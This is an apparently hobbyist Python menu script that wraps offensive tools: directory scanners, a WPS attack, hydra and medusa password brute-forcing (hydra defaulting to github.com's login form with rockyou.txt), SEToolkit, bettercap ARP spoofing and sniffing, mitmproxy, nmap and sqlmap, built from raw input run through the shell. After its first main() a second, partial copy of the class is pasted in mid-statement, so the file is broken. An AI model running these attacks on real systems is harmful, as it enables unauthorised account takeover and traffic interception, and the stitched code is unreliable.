import os
import sys
import subprocess
from pathlib import Path
from datetime import datetime

class SimpleAttacker:
    def __init__(self):
        self.results_dir = Path("results") / datetime.now().strftime("%Y%m%d_%H%M%S")
        self.results_dir.mkdir(parents=True, exist_ok=True)
        
    def print_header(self):
        print("\n" + "="*60)
        print("ULTIMATE SIMPLE COMMANDER FOR PENTESTING")
        print("Oneclick Commands, silent process! Made by Taief")
        print("="*60)
    
    def run_command_live(self, cmd, tool_name):
        """Run command with live output - YOUR WAY"""
        print(f"\n🚀 Running: {cmd}")
        print("-" * 60)
        
        output_file = self.results_dir / f"{tool_name}.txt"
        
        with open(output_file, "w") as f:
            f.write(f"Command: {cmd}\n")
            f.write("="*60 + "\n")
            
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            
            while True:
                line = process.stdout.readline()
                if not line and process.poll() is not None:
                    break
                
                if line:
                    print(line, end='', flush=True)
                    f.write(line)
                    f.flush()
            
            print("\n" + "-" * 60)
            print(f"✅ Done! Output saved to: {output_file}")
    
    def check_and_install_tool(self, tool_name, install_cmd):
        """Check if tool is installed and install if not"""
        check_cmd = f"which {tool_name}"
        result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)
        
        if result.returncode != 0:
            print(f"⚠️ {tool_name} not found!")
            install = input(f"Install {tool_name} now? (y/N): ").strip().lower()
            if install == 'y':
                print(f"Installing {tool_name}...")
                subprocess.run(install_cmd, shell=True)
                print(f"✅ {tool_name} installed!")
                return True
            else:
                print(f"❌ {tool_name} is required but not installed!")
                return False
        return True
    
    def clone_from_github(self, repo_url, target_dir):
        """Clone tool from GitHub if not present"""
        if not Path(target_dir).exists():
            print(f"📥 Cloning from {repo_url}...")
            result = subprocess.run(f"git clone {repo_url} {target_dir}", shell=True)
            if result.returncode == 0:
                print(f"✅ Successfully cloned to {target_dir}")
                return True
            else:
                print(f"❌ Failed to clone {repo_url}")
                return False
        return True
    
    def run_gobuster(self):
        """YOUR COMMAND: sudo gobuster dir -u https://pihatch.com -w (directory) --exclude-length 18979"""
        if not self.check_and_install_tool("gobuster", "sudo apt install -y gobuster"):
            return
        
        print("\n📁 GOBUSTER DIRECTORY SCAN")
        url = input("Target URL (https://example.com): ").strip()
        wordlist = input("Wordlist [/usr/share/wordlists/dirb/common.txt]: ").strip()
        
        if not wordlist:
            wordlist = "/usr/share/wordlists/dirb/common.txt"
        
        cmd = f"sudo gobuster dir -u {url} -w {wordlist} --exclude-length 18979"
        self.run_command_live(cmd, "gobuster")
    
    def run_dirb(self):
        if not self.check_and_install_tool("dirb", "sudo apt install -y dirb"):
            return
        
        print("\n📁 DIRB DIRECTORY SCAN")
        url = input("Target URL (http://example.com): ").strip()
        wordlist = input("Wordlist [/usr/share/wordlists/dirb/common.txt]: ").strip()
        
        if not wordlist:
            wordlist = "/usr/share/wordlists/dirb/common.txt"
        
        cmd = f"dirb {url} {wordlist}"
        self.run_command_live(cmd, "dirb")
    
    def run_oneshot(self):
        print("\n🔓 ONESHOT WPS ATTACK")
        
        # Check if OneShot exists, clone if not
        oneshot_paths = ["OneShot/oneshot.py", "./oneshot.py", "oneshot.py"]
        oneshot_dir = "OneShot"
        
        for path in oneshot_paths:
            if Path(path).exists():
                print(f"✅ Found OneShot at: {path}")
                oneshot_path = path
                break
        else:
            print("❌ OneShot not found!")
            clone = input("Clone OneShot from GitHub? (y/N): ").strip().lower()
            if clone == 'y':
                if self.clone_from_github("https://github.com/kimocoder/OneShot.git", oneshot_dir):
                    oneshot_path = "OneShot/oneshot.py"
                    # Install dependencies
                    print("📦 Installing OneShot dependencies...")
                    subprocess.run("pip3 install -r OneShot/requirements.txt", shell=True)
                else:
                    return
            else:
                print("❌ OneShot is required for this attack!")
                return
        
        interface = input("Wireless interface (wlan0): ").strip() or "wlan0"
        
        cmd = f"sudo python3 {oneshot_path} -i {interface} -K"
        self.run_command_live(cmd, "oneshot")
    
    def run_hydra(self):
        if not self.check_and_install_tool("hydra", "sudo apt install -y hydra"):
            return
        
        print("\n🔐 HYDRA LOGIN ATTACK")
        
        target = input("Target (github.com): ").strip() or "github.com"
        username = input("Username (admin): ").strip() or "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
        password_file = input("Password file [/usr/share/wordlists/rockyou.txt]: ").strip()
        
        if not password_file:
            password_file = "/usr/share/wordlists/rockyou.txt"
        
        # Check if wordlists exist
        if not Path(password_file).exists():
            print(f"⚠️ Password file not found: {password_file}")
            download = input("Download rockyou.txt? (y/N): ").strip().lower()
            if download == 'y':
                print("📥 Extracting rockyou.txt...")
                subprocess.run("sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true", shell=True)
        
        cmd = f'sudo hydra -t 4 -V -f -l {username} -P {password_file} {target} http-post-form "/login:Username or email address=^USER^&Password=^PASS^&Login=Sign in:F=Incorrect username or password."'
        self.run_command_live(cmd, "hydra")
    
    def run_medusa(self):
        if not self.check_and_install_tool("medusa", "sudo apt install -y medusa"):
            return
        
        print("\n⚡ MEDUSA ATTACK")
        
        target = input("Target IP/URL: ").strip()
        username = input("Username (admin): ").strip() or "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
        password_file = input("Password file: ").strip() or "/usr/share/wordlists/rockyou.txt"
        
        cmd = f"medusa -h {target} -u {username} -P {password_file} -M http"
        self.run_command_live(cmd, "medusa")
    
    def run_setoolkit(self):
        if not self.check_and_install_tool("setoolkit", "sudo apt install -y set"):
            return
        
        print("\n🎭 SETOOLKIT SOCIAL ENGINEERING")
        print("Launching SEToolkit...")
        
        cmd = "setoolkit"
        self.run_command_live(cmd, "setoolkit")
    
    def run_bettercap(self):
        if not self.check_and_install_tool("bettercap", "sudo apt install -y bettercap"):
            return
        
        print("\n👂 BETTERCAP MITM ATTACK")
        
        interface = input("Network interface (eth0): ").strip() or "eth0"
        target = input("Target IP/Range (192.168.1.0/24): ").strip() or "192.168.1.0/24"
        
        cmd = f"sudo bettercap -iface {interface}"
        print(f"\n🚀 Manually run in Bettercap:")
        print(f"  net.probe on")
        print(f"  net.recon on")
        print(f"  set arp.spoof.targets {target}")
        print(f"  arp.spoof on")
        print(f"  net.sniff on")
        
        run_now = input("\nRun Bettercap now? (y/N): ").strip().lower()
        if run_now == 'y':
            self.run_command_live(cmd, "bettercap")
    
    def run_mitmproxy(self):
        if not self.check_and_install_tool("mitmproxy", "sudo apt install -y mitmproxy"):
            return
        
        print("\n🌐 MITMPROXY INTERCEPTION")
        port = input("Port (8080): ").strip() or "8080"
        
        cmd = f"mitmproxy -p {port}"
        self.run_command_live(cmd, "mitmproxy")
    
    def run_nmap(self):
        if not self.check_and_install_tool("nmap", "sudo apt install -y nmap"):
            return
        
        print("\n🔍 NMAP SCAN")
        target = input("Target (192.168.1.1) or example.com : ").strip() or "192.168.1.1"
        
        cmd = f"nmap -sV -sC {target}"
        self.run_command_live(cmd, "nmap")
    
    def run_sqlmap(self):
        if not self.check_and_install_tool("sqlmap", "sudo apt install -y sqlmap"):
            return
        
        print("\n💉 SQLMAP INJECTION TEST")
        url = input("Target URL with parameter (http://test.com/page?id=1): ").strip()
        
        if not url:
            print("❌ No URL provided!")
            return
        
        cmd = f"sqlmap -u '{url}' --batch"
        self.run_command_live(cmd, "sqlmap")
    
    def run_quick_scan(self):
        """QUICK ALL-IN-ONE SCAN"""
        print("\n⚡ QUICK ALL-IN-ONE SCAN")
        target = input("Target (example.com or IP): ").strip()
        
        if not target:
            print("❌ No target provided!")
            return
        
        # Check required tools
        tools_to_check = [
            ("nmap", "sudo apt install -y nmap"),
            ("gobuster", "sudo apt install -y gobuster"),
            ("hydra", "sudo apt install -y hydra")
        ]
        
        for tool, install_cmd in tools_to_check:
            self.check_and_install_tool(tool, install_cmd)
        
        print(f"\n🎯 Running quick scans on {target}...")
        
        # 1. Nmap
        if input("\nRun Nmap scan? (y/N): ").strip().lower() == 'y':
            cmd = f"nmap -sV -sC {target}"
            self.run_command_live(cmd, "quick_nmap")
        
        # 2. Gobuster (if looks like URL)
        if ("http://" in target or "https://" in target) and input("\nRun Gobuster? (y/N): ").strip().lower() == 'y':
            cmd = f"sudo gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt --exclude-length 18979"
            self.run_command_live(cmd, "quick_gobuster")
        
        # 3. Check for login page
        if input("\nCheck for common logins? (y/N): ").strip().lower() == 'y':
            cmd = f"sudo hydra -t 4 -f -l admin -P /usr/share/wordlists/rockyou.txt {target} http-post-form \"/:user=admin&pass=^PASS^:F=Invalid\""
            self.run_command_live(cmd, "quick_hydra")
        
        print(f"\n✅ Quick scan complete! Check {self.results_dir}")
    
    def install_all_tools(self):
        """Option to install all tools at once"""
        print("\n🛠️ INSTALL ALL TOOLS")
        print("This will install all recommended pentesting tools.")
        
        confirm = input("Continue? (y/N): ").strip().lower()
        if confirm != 'y':
            return
        
        tools = [
            "gobuster",
            "dirb", 
            "hydra",
            "medusa",
            "set",
            "bettercap",
            "mitmproxy",
            "nmap",
            "sqlmap",
            "wordlists"
        ]
        
        print("\n📦 Installing tools...")
        subprocess.run("sudo apt update", shell=True)
        
        # Install main tools
        install_cmd = "sudo apt install -y gobuster dirb hydra medusa set bettercap mitmproxy nmap sqlmap"
        subprocess.run(install_cmd, shell=True)
        
        # Install wordlists
        print("\n📚 Installing wordlists...")
        subprocess.run("sudo apt install -y wordlists seclists", shell=True)
        
        # Clone OneShot
        print("\n📥 Cloning OneShot...")
        self.clone_from_github("https://github.com/kimocoder/OneShot.git", "OneShot")
        
        print("\n✅ All tools installed!")
        print("Note: Some tools may need additional configuration.")
    
    def main_menu(self):
        while True:
            self.print_header()
            
            print("\nYOUR TOOLS:")
            print(" 1. 📁 Gobuster (Directory scan)")
            print(" 2. 📁 Dirb (Directory scan)")
            print(" 3. 🔓 OneShot (WPS attack)")
            print(" 4. 🔐 Hydra (Login brute force)")
            print(" 5. ⚡ Medusa (Fast login attacks)")
            print(" 6. 🎭 SEToolkit (Social engineering)")
            print(" 7. 👂 Bettercap (MITM attacks)")
            print(" 8. 🌐 MITMproxy (Web interception)")
            print(" 9. 🔍 Nmap (Port scanning)")
            print("10. 💉 SQLMap (SQL injection)")
            print("11. ⚡ Quick All-in-One Scan")
            print("12. 🛠️ Install All Tools")
            print("13. 🚪 Exit")
            
            choice = input("\nSelect (1-13): ").strip()
            
            menu_options = {
                "1": self.run_gobuster,
                "2": self.run_dirb,
                "3": self.run_oneshot,
                "4": self.run_hydra,
                "5": self.run_medusa,
                "6": self.run_setoolkit,
                "7": self.run_bettercap,
                "8": self.run_mitmproxy,
                "9": self.run_nmap,
                "10": self.run_sqlmap,
                "11": self.run_quick_scan,
                "12": self.install_all_tools
            }
            
            if choice in menu_options:
                menu_options[choice]()
            elif choice == "13":
                print("\n👋 Goodbye!")
                break
            else:
                print("❌ Invalid choice!")
            
            input("\nPress Enter to continue...")

def main():
    """Main function"""
    # Check for root
    if os.geteuid() != 0:
        print("⚠️ Note: Some commands need sudo")
        print("Consider running with: sudo python3 script.py")
    
    # Run
    attacker = SimpleAttacker()
    attacker.main_menu()

if __name__ == "__main__":
    main()            )
            
            
            while True:
                line = process.stdout.readline()
                if not line and process.poll() is not None:
                    break
                
                if line:
                    print(line, end='', flush=True)
                    f.write(line)
                    f.flush()
            
            print("\n" + "-" * 60)
            print(f"✅ Done! Output saved to: {output_file}")
    
    
    
    def run_gobuster(self):
        """YOUR COMMAND: sudo gobuster dir -u https://pihatch.com -w (directory) --exclude-length 18979"""
        print("\n📁 GOBUSTER DIRECTORY SCAN")
        url = input("Target URL (https://example.com): ").strip()
        wordlist = input("Wordlist [/usr/share/wordlists/dirb/common.txt]: ").strip()
        
        if not wordlist:
            wordlist = "/usr/share/wordlists/dirb/common.txt"
        
        
        cmd = f"sudo gobuster dir -u {url} -w {wordlist} --exclude-length 18979"
        self.run_command_live(cmd, "gobuster")
    
    def run_dirb(self):
        
        print("\n📁 DIRB DIRECTORY SCAN")
        url = input("Target URL (http://example.com): ").strip()
        wordlist = input("Wordlist [/usr/share/wordlists/dirb/common.txt]: ").strip()
        
        if not wordlist:
            wordlist = "/usr/share/wordlists/dirb/common.txt"
        
        
      
        cmd = f"dirb {url} {wordlist}"
        self.run_command_live(cmd, "dirb")
    
    def run_oneshot(self):
       
        print("\n🔓 ONESHOT WPS ATTACK")
        
        
        oneshot_path = None
        for path in ["OneShot/oneshot.py", "./oneshot.py", "oneshot.py"]:
            if Path(path).exists():
                oneshot_path = path
                break
        
        if not oneshot_path:
            print("❌ OneShot not found in current directory!")
            print("Make sure OneShot folder exists with oneshot.py")
            return
        
        interface = input("Wireless interface (wlan0): ").strip() or "wlan0"
        
        
        cmd = f"sudo python3 {oneshot_path} -i {interface} -K"
        self.run_command_live(cmd, "oneshot")
    
    def run_hydra(self):
        
        print("\n🔐 HYDRA LOGIN ATTACK")
        
        target = input("Target (github.com): ").strip() or "github.com"
        username = input("Username (admin): ").strip() or "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
        password_file = input("Password file [/usr/share/wordlists/rockyou.txt]: ").strip()
        
        if not password_file:
            password_file = "/usr/share/wordlists/rockyou.txt"
        
        
        cmd = f'sudo hydra -t 4 -V -f -l {username} -P {password_file} {target} http-post-form "/login:Username or email address=^USER^&Password=^PASS^&Login=Sign in:F=Incorrect username or password."'
        self.run_command_live(cmd, "hydra")
    
    def run_medusa(self):
        
        print("\n⚡ MEDUSA ATTACK")
        
        target = input("Target IP/URL: ").strip()
        username = input("Username (admin): ").strip() or "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
        password_file = input("Password file: ").strip() or "/usr/share/wordlists/rockyou.txt"
        
        
        cmd = f"medusa -h {target} -u {username} -P {password_file} -M http"
        self.run_command_live(cmd, "medusa")
    
    def run_setoolkit(self):
        
        print("\n🎭 SETOOLKIT SOCIAL ENGINEERING")
        print("Launching SEToolkit in new terminal...")
        
        
        cmd = "setoolkit"
        self.run_command_live(cmd, "setoolkit")
    
    def run_bettercap(self):
        
        print("\n👂 BETTERCAP MITM ATTACK")
        
        interface = input("Network interface (eth0): ").strip() or "eth0"
        target = input("Target IP/Range (192.168.1.0/24): ").strip() or "192.168.1.0/24"
        
        
        cmd = f"sudo bettercap -iface {interface}"
        print(f"\n🚀 Manually run in Bettercap:")
        print(f"  net.probe on")
        print(f"  net.recon on")
        print(f"  set arp.spoof.targets {target}")
        print(f"  arp.spoof on")
        print(f"  net.sniff on")
        
        run_now = input("\nRun Bettercap now? (y/N): ").strip().lower()
        if run_now == 'y':
            self.run_command_live(cmd, "bettercap")
    
    def run_mitmproxy(self):
        """SIMPLE MITMproxy"""
        print("\n🌐 MITMPROXY INTERCEPTION")
        port = input("Port (8080): ").strip() or "8080"
        
        
        cmd = f"mitmproxy -p {port}"
        self.run_command_live(cmd, "mitmproxy")
    
    def run_nmap(self):
        """SIMPLE Nmap scan"""
        print("\n🔍 NMAP SCAN")
        target = input("Target (192.168.1.1) or example.com : ").strip() or "192.168.1.1"
        
        
        cmd = f"nmap -sV -sC {target}"
        self.run_command_live(cmd, "nmap")
    
    def run_sqlmap(self):
        
        print("\n💉 SQLMAP INJECTION TEST")
        url = input("Target URL with parameter (http://test.com/page?id=1): ").strip()
        
        if not url:
            print("❌ No URL provided!")
            return
        
        
        cmd = f"sqlmap -u '{url}' --batch"
        self.run_command_live(cmd, "sqlmap")
    
    def run_quick_scan(self):
       
        print("\n⚡ QUICK ALL-IN-ONE SCAN")
        target = input("Target (example.com or IP): ").strip()
        
        if not target:
            print("❌ No target provided!")
            return
        
        print(f"\n🎯 Running quick scans on {target}...")
        
        # 1. Nmap
        if input("\nRun Nmap scan? (y/N): ").strip().lower() == 'y':
            cmd = f"nmap -sV -sC {target}"
            self.run_command_live(cmd, "quick_nmap")
        
        # 2. Gobuster (if looks like URL)
        if ("http://" in target or "https://" in target) and input("\nRun Gobuster? (y/N): ").strip().lower() == 'y':
            cmd = f"sudo gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt --exclude-length 18979"
            self.run_command_live(cmd, "quick_gobuster")
        
        # 3. Check for login page
        if input("\nCheck for common logins? (y/N): ").strip().lower() == 'y':
            cmd = f"sudo hydra -t 4 -f -l admin -P /usr/share/wordlists/rockyou.txt {target} http-post-form \"/:user=admin&pass=^PASS^:F=Invalid\""
            self.run_command_live(cmd, "quick_hydra")
        
        print(f"\n✅ Quick scan complete! Check {self.results_dir}")
    
    def main_menu(self):
        
        while True:
            self.print_header()
            
            print("\nYOUR TOOLS:")
            print(" 1. 📁 Gobuster (Directory scan)")
            print(" 2. 📁 Dirb (Directory scan)")
            print(" 3. 🔓 OneShot (WPS attack)")
            print(" 4. 🔐 Hydra (Login brute force)")
            print(" 5. ⚡ Medusa (Fast login attacks)")
            print(" 6. 🎭 SEToolkit (Social engineering)")
            print(" 7. 👂 Bettercap (MITM attacks)")
            print(" 8. 🌐 MITMproxy (Web interception)")
            print(" 9. 🔍 Nmap (Port scanning)")
            print("10. 💉 SQLMap (SQL injection)")
            print("11. ⚡ Quick All-in-One Scan")
            print("12. 🚪 Exit")
            
            choice = input("\nSelect (1-12): ").strip()
            
            if choice == "1":
                self.run_gobuster()
            elif choice == "2":
                self.run_dirb()
            elif choice == "3":
                self.run_oneshot()
            elif choice == "4":
                self.run_hydra()
            elif choice == "5":
                self.run_medusa()
            elif choice == "6":
                self.run_setoolkit()
            elif choice == "7":
                self.run_bettercap()
            elif choice == "8":
                self.run_mitmproxy()
            elif choice == "9":
                self.run_nmap()
            elif choice == "10":
                self.run_sqlmap()
            elif choice == "11":
                self.run_quick_scan()
            elif choice == "12":
                print("\n👋 Goodbye!")
                break
            else:
                print("❌ Invalid choice!")
            
            input("\nPress Enter to continue...")

def main():
    """Main function"""
    # Check for root
    if os.geteuid() != 0:
        print("⚠️ Note: Some commands need sudo")
    
    # Run
    attacker = SimpleAttacker()
    attacker.main_menu()

if __name__ == "__main__":
    main()
